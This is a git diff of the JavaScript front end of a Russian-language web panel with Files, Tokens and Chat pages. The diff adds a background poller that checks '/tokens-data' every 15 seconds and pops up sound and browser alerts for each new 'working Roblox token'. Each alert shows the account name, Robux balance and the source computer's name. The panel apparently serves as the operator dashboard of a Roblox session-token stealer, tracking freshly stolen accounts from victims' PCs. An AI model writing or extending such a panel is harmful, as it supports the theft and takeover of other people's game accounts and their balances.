@@ -87,7 +87,6 @@ async function apiFetch(path, opts = {}) {
   }
 }
 
-// Абсолютный URL для статики сервера (превью /uploads/...)
 function assetUrl(path) { return API_BASE + path; }
 
 // ── UI-помощники ──────────────────────────────────────────────────────────────
@@ -99,28 +98,148 @@ function toast(msg, type = "ok") {
   setTimeout(function() { t.className = ""; }, 3000);
 }
 
-function playChime() {
+// ── Звуковой синтезатор уведомлений ──────────────────────────────────────────
+function playNotificationSound() {
   try {
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const AudioContext = window.AudioContext || window.webkitAudioContext;
+    if (!AudioContext) return;
+    const ctx = new AudioContext();
+    if (ctx.state === 'suspended') {
+      ctx.resume();
+    }
     const now = ctx.currentTime;
-    const osc1 = ctx.createOscillator();
-    const gain1 = ctx.createGain();
-    osc1.type = "sine";
-    osc1.frequency.setValueAtTime(783.99, now);
-    osc1.frequency.exponentialRampToValueAtTime(1046.5, now + 0.15);
-    gain1.gain.setValueAtTime(0.12, now);
-    gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
-    osc1.connect(gain1); gain1.connect(ctx.destination);
-    const osc2 = ctx.createOscillator();
-    const gain2 = ctx.createGain();
-    osc2.type = "sine";
-    osc2.frequency.setValueAtTime(1318.51, now + 0.08);
-    gain2.gain.setValueAtTime(0.08, now + 0.08);
-    gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.6);
-    osc2.connect(gain2); gain2.connect(ctx.destination);
-    osc1.start(now); osc1.stop(now + 0.5);
-    osc2.start(now + 0.08); osc2.stop(now + 0.6);
+
+    // Мелодичный 3-тональный перезвон прибытия токена (E5 -> G#5 -> B5 -> E6)
+    const freqs = [659.25, 830.61, 987.77, 1318.51];
+    freqs.forEach((freq, idx) => {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      
+      osc.type = 'sine';
+      osc.frequency.setValueAtTime(freq, now + idx * 0.07);
+
+      gain.gain.setValueAtTime(0.001, now + idx * 0.07);
+      gain.gain.exponentialRampToValueAtTime(0.18, now + idx * 0.07 + 0.02);
+      gain.gain.exponentialRampToValueAtTime(0.0001, now + idx * 0.07 + 0.45);
+
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+
+      osc.start(now + idx * 0.07);
+      osc.stop(now + idx * 0.07 + 0.5);
+    });
+  } catch (e) {
+    console.warn('Audio chime error:', e);
+  }
+}
+
+// ── Визуальное уведомление о токене ───────────────────────────────────────────
+function showTokenNotification(info) {
+  if (!info) return;
+  playNotificationSound();
+
+  let container = document.getElementById('tokenNotificationContainer');
+  if (!container) {
+    container = document.createElement('div');
+    container.id = 'tokenNotificationContainer';
+    container.className = 'token-notification-container';
+    document.body.appendChild(container);
+  }
+
+  const el = document.createElement('div');
+  el.className = 'token-notification-card';
+  
+  const username = escapeHtml(info.username || 'Roblox User');
+  const robuxNum = Number(info.robux) || 0;
+  const robuxStr = robuxNum > 0 ? robuxNum.toLocaleString() + ' R$' : '0 R$';
+  const computer = escapeHtml(info.computer || 'Unknown PC');
+  
+  let avatarHtml = `<div class="token-notif-avatar"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>`;
+  if (info.userId) {
+    avatarHtml = `<div class="token-notif-avatar"><img src="${API_BASE}/avatar-proxy/${info.userId}" onerror="this.outerHTML='<div class=\\'token-notif-avatar\\'>O</div>'"></div>`;
+  }
+
+  el.innerHTML = `
+    <button class="token-notif-close" onclick="this.parentElement.remove()">✕</button>
+    <div class="token-notif-header">
+      <span class="token-notif-dot"></span>
+      <span class="token-notif-title">Рабочий токен Roblox</span>
+    </div>
+    <div class="token-notif-body">
+      ${avatarHtml}
+      <div class="token-notif-info">
+        <div class="token-notif-user">${username}</div>
+        <div class="token-notif-pc">ПК: ${computer}</div>
+      </div>
+      <div class="token-notif-robux">${robuxStr}</div>
+    </div>
+  `;
+
+  container.appendChild(el);
+
+  // Системное уведомление браузера
+  if ("Notification" in window && Notification.permission === "granted") {
+    try {
+      new Notification("Новый рабочий токен Roblox!", {
+        body: `${username} (${computer}) — Баланс: ${robuxStr}`,
+        icon: info.userId ? `${API_BASE}/avatar-proxy/${info.userId}` : undefined
+      });
+    } catch (e) {}
+  }
+
+  setTimeout(() => {
+    if (el.parentElement) {
+      el.style.opacity = '0';
+      el.style.transform = 'translateX(60px)';
+      setTimeout(() => el.remove(), 300);
+    }
+  }, 7000);
+}
+
+// ── Фоновый слушатель новых токенов ──────────────────────────────────────────
+let lastKnownTokenIds = new Set();
+let isFirstTokenLoad = true;
+
+async function checkNewTokensBackground() {
+  if (!getToken()) return;
+  try {
+    const resp = await apiFetch('/tokens-data');
+    if (!resp.ok) return;
+    const tokens = await resp.json();
+    if (!Array.isArray(tokens)) return;
+
+    if (isFirstTokenLoad) {
+      // При первой загрузке запоминаем уже имеющиеся токены
+      tokens.forEach(t => {
+        const id = t.file || t.userId || t.security;
+        if (id) lastKnownTokenIds.add(id);
+      });
+      isFirstTokenLoad = false;
+      return;
+    }
+
+    // Ищем новые токены, которых не было
+    tokens.forEach(t => {
+      const id = t.file || t.userId || t.security;
+      if (id && !lastKnownTokenIds.has(id)) {
+        lastKnownTokenIds.add(id);
+        if (t.valid) {
+          showTokenNotification({
+            username: t.username || t.user,
+            userId: t.userId,
+            robux: t.robux,
+            computer: t.computer
+          });
+        }
+      }
+    });
   } catch (e) {}
+}
+
+// Фоновый таймер проверки новых токенов каждые 15 сек
+if (getToken()) {
+  setInterval(checkNewTokensBackground, 15000);
+  setTimeout(checkNewTokensBackground, 2000);
 }
 
 function escapeHtml(s) {
@@ -180,6 +299,7 @@ function renderHeader(activePage) {
 
   const iconDashboard = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9"></rect><rect x="14" y="3" width="7" height="5"></rect><rect x="14" y="12" width="7" height="9"></rect><rect x="3" y="16" width="7" height="5"></rect></svg>`;
   const iconTokens = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>`;
+  const iconChat = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>`;
   const iconUpdates = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>`;
   const iconSettings = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>`;
 
@@ -190,12 +310,13 @@ function renderHeader(activePage) {
     <div class="nav-links">
       ${navLink('files', 'index.html', iconDashboard, 'Файлы')}
       ${navLink('tokens', 'tokens.html', iconTokens, 'Токены')}
+      ${navLink('chat', 'chat.html', iconChat, 'Чат')}
       ${navLink('updates', 'updates.html', iconUpdates, 'Обновления')}
       ${navLink('settings', 'settings.html', iconSettings, 'Настройки', 'desktop-only')}
       
       <!-- Mobile only Profile Link -->
       <a href="settings.html" class="nav-link mobile-profile-link ${activePage === 'settings' ? 'active' : ''}">
-        <div class="nav-icon user-avatar" style="width: 22px; height: 22px; font-size: 0.75rem;">${avatarHtml}</div>
+        <div class="nav-icon user-avatar" style="width: 24px; height: 24px; font-size: 0.75rem;">${avatarHtml}</div>
         <span class="nav-label">Профиль</span>
       </a>
     </div>
